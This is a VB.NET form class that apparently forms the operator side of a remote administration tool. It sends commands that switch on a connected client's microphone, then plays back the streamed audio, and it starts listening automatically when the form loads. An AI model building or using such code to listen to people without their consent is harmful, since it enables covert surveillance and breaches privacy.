Imports NAudio.Wave

Public Class MIC
    Public C As Client
    Public waveplayer As WaveOut = New WaveOut()
    Public bwp As BufferedWaveProvider = New BufferedWaveProvider(New WaveFormat(8000, 16, 1))
    Private Sub MIC_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Button1.PerformClick()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If Button1.Text = "Start" Then

                Dim B As Byte() = SB("MIC" + Settings.SPL + ComboBox2.SelectedIndex.ToString)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

                Button1.Text = "Stop"
            Else


                Dim B As Byte() = SB("CLOSEMIC")
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

                Button1.Text = "Start"
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub MIC_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            waveplayer.Stop()
            waveplayer?.Dispose()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try


        Dim B As Byte() = SB("ENDMIC")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged

        Dim B As Byte() = SB("CLOSEMIC")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

        Button1.Text = "Start"

    End Sub
End Class